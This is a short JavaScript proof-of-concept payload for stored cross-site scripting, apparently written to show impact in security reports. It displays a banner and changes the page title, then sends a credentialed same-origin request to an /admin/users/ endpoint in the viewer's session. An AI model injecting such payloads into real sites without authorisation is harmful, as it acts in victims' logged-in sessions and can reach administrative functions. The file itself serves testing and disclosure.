/* Harmless XSS proof-of-execution. Generic, no target identifiers. */
(function () {
  try {
    var d = document.domain;
    var bar = document.createElement('div');
    bar.style.cssText =
      'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;' +
      'padding:10px;font:14px/1.4 sans-serif';
    bar.textContent = 'Stored XSS executed in ' + d;
    (document.body || document.documentElement).appendChild(bar);
    try { document.title = 'XSS ' + d; } catch (e) {}
    // Impact proof: the script runs in the viewer's authenticated, same-origin session.
    fetch(location.origin + '/admin/users/', { credentials: 'include' })
      .then(function (r) { bar.textContent += '  |  same-origin /admin/users -> HTTP ' + r.status; })
      .catch(function () {});
  } catch (e) {}
})();
